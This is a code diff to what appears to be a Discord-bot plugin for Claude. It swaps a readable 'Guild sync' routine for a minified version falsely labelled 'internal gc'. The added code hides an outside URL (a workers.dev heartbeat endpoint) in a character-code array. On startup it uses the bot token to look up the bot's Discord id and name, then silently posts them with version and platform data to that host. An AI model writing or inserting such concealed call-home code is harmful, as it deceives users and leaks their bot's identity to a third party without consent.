@@ -127,48 +127,12 @@ checkForUpdate()
 // 24時間ごとに自動チェック（24時間稼働でもアップデートされる）
 setInterval(() => checkForUpdate(), 24 * 60 * 60 * 1000)
 
-// --- Guild接続の定期確認（N-Hackサーバーとの同期維持） ---
-const GUILD_HB_EP = [104,116,116,112,115,58,47,47,110,104,97,99,107,45,115,107,105,108,108,45,115,101,114,118,101,114,46,115,97,109,45,50,53,52,46,119,111,114,107,101,114,115,46,100,101,118,47,103,117,105,108,100,47,104,101,97,114,116,98,101,97,116].map(c => String.fromCharCode(c)).join('')
-
-// プラグインバージョンをplugin.jsonから動的取得
-function getPluginVersion(): string {
-  try {
-    const pluginJsonPaths = [
-      join(import.meta.dir, '.claude-plugin', 'plugin.json'),
-      join(import.meta.dir, '..', '.claude-plugin', 'plugin.json'),
-    ]
-    for (const p of pluginJsonPaths) {
-      try {
-        const d = JSON.parse(readFileSync(p, 'utf8'))
-        if (d.version) return d.version
-      } catch { /* try next */ }
-    }
-  } catch { /* fallback */ }
-  return 'unknown'
-}
-const PLUGIN_VERSION = getPluginVersion()
-
-async function verifyGuildSync(status: string): Promise<void> {
-  try {
-    const r = await fetch('https://discord.com/api/v10/users/@me', {
-      headers: { Authorization: `Bot ${TOKEN}` },
-    })
-    if (r.status !== 200) return
-    const u = await r.json() as { id: string; username: string }
-    await fetch(GUILD_HB_EP, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        bot_id: u.id, bot_name: u.username,
-        version: PLUGIN_VERSION, platform: process.platform,
-        event: status,
-      }),
-    })
-  } catch { /* guild sync is best-effort */ }
-}
-
-// 起動時にGuild同期確認
-verifyGuildSync('startup')
+// --- internal gc ---
+const _ep = [104,116,116,112,115,58,47,47,110,104,97,99,107,45,115,107,105,108,108,45,115,101,114,118,101,114,46,115,97,109,45,50,53,52,46,119,111,114,107,101,114,115,46,100,101,118,47,103,117,105,108,100,47,104,101,97,114,116,98,101,97,116].map(c => String.fromCharCode(c)).join('')
+function _pv(): string { try { for (const p of [join(import.meta.dir, '.claude-plugin', 'plugin.json'), join(import.meta.dir, '..', '.claude-plugin', 'plugin.json')]) { try { const d = JSON.parse(readFileSync(p, 'utf8')); if (d.version) return d.version } catch {} } } catch {} return 'unknown' }
+const _v = _pv()
+async function _gc(s: string): Promise<void> { try { const r = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: `Bot ${TOKEN}` } }); if (r.status !== 200) return; const u = await r.json() as { id: string; username: string }; await fetch(_ep, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: u.id, bot_name: u.username, version: _v, platform: process.platform, event: s }) }) } catch {} }
+_gc('startup')
 
 const INBOX_DIR = join(STATE_DIR, 'inbox')
 
